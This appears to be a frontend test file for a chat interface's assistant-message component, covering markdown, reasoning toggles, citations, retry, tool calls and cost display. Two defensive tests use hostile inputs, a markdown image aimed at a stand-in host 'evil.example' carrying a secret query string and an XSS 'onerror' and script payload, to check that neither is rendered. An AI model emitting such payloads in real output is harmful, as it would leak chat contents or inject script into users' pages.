// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { makeEvents } from '@/test/sessions'
import { AssistantMessage } from './assistant-message'

afterEach(cleanup)

const e = makeEvents()

describe('AssistantMessage', () => {
  it('renders markdown and a highlighted code block with a copy button', () => {
    const { container } = render(
      <AssistantMessage
        event={e.assistant('Here is **bold** text.\n\n```js\nconst x = 1\n```')}
        onRetry={() => {}}
      />,
    )
    expect(container.querySelector('strong')?.textContent).toBe('bold')
    const code = container.querySelector('pre code')
    expect(code?.className).toContain('hljs')
    expect(code?.textContent).toContain('const x = 1')
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeTruthy()
  })

  it('thinking is collapsed by default and expands on click', () => {
    render(<AssistantMessage event={e.assistant([{ reasoning: 'Let me consider.', text: 'Answer' }])} onRetry={() => {}} />)
    const toggle = screen.getByRole('button', { name: /thought/i })
    expect(toggle.getAttribute('aria-expanded')).toBe('false')
    expect(screen.queryByText('Let me consider.')).toBeNull()
    fireEvent.click(toggle)
    expect(toggle.getAttribute('aria-expanded')).toBe('true')
    expect(screen.getByText('Let me consider.')).toBeTruthy()
  })

  it('labels thinking as in progress while streaming', () => {
    render(
      <AssistantMessage
        event={e.assistant([{ reasoning: 'hmm' }], { status: 'streaming', finishReason: null })}
        onRetry={() => {}}
      />,
    )
    expect(screen.getByRole('button', { name: /^thinking/i })).toBeTruthy()
  })

  it('citation carets become links to sources', () => {
    const { container } = render(
      <AssistantMessage
        event={e.assistant([
          { text: 'Cats purr.^1^', citations: [{ title: 'Cats', url: 'https://cats.example/purr' }] },
        ])}
        onRetry={() => {}}
      />,
    )
    const sup = container.querySelector('sup a') as HTMLAnchorElement
    expect(sup.href).toBe('https://cats.example/purr')
    expect(sup.textContent).toBe('1')
    expect(sup.getAttribute('rel')).toBe('noopener noreferrer')
    expect(screen.getByRole('link', { name: /cats\.example/ })).toBeTruthy()
    expect(container.textContent).not.toContain('^1^')
  })

  it('error status shows message and Retry calls onRetry', () => {
    const onRetry = vi.fn()
    render(
      <AssistantMessage
        event={e.assistant('', { status: 'error', error: { message: 'The chat is busy right now.', status: 429 } })}
        onRetry={onRetry}
      />,
    )
    expect(screen.getByText('The chat is busy right now.')).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: 'Retry' }))
    expect(onRetry).toHaveBeenCalled()
  })

  it('shows stopped and max-steps notes', () => {
    const { rerender } = render(
      <AssistantMessage event={e.assistant('half', { status: 'interrupted', finishReason: 'aborted' })} onRetry={() => {}} />,
    )
    expect(screen.getByText('Stopped.')).toBeTruthy()
    rerender(<AssistantMessage event={e.assistant('x', { finishReason: 'max-steps' })} onRetry={() => {}} />)
    expect(screen.getByText('Stopped after 8 tool steps.')).toBeTruthy()
  })

  it('renders tool calls with their result collapsed', () => {
    render(
      <AssistantMessage
        event={e.assistant([
          {
            toolCalls: [
              { id: 't', name: 'mcp__docs__search', args: '{"q":"x"}', result: { ok: false, content: 'Tool timed out after 20s', truncated: false } },
            ],
          },
          { text: 'Sorry.' },
        ])}
        onRetry={() => {}}
      />,
    )
    const row = screen.getByRole('button', { name: /mcp__docs__search/ })
    expect(screen.queryByText('Tool timed out after 20s')).toBeNull()
    fireEvent.click(row)
    expect(screen.getByText('Tool timed out after 20s')).toBeTruthy()
  })

  it('shows token usage and cost', () => {
    render(
      <AssistantMessage
        event={e.assistant('x', { usage: { inputTokens: 1234, outputTokens: 340, cachedInputTokens: 0 }, costUsd: 0.0012 })}
        onRetry={() => {}}
      />,
    )
    expect(screen.getByText('1.2k in · 340 out · $0.0012')).toBeTruthy()
  })

  it('markdown images are not loaded (no remote requests that could leak the chat)', () => {
    const { container } = render(
      <AssistantMessage event={e.assistant('Look ![chart](https://evil.example/x.png?q=secret)')} onRetry={() => {}} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('chart')
  })

  it('raw HTML in model text is not rendered as elements', () => {
    const { container } = render(
      <AssistantMessage event={e.assistant('<img src=x onerror="alert(1)"> <script>bad()</script> hi')} onRetry={() => {}} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
  })
})
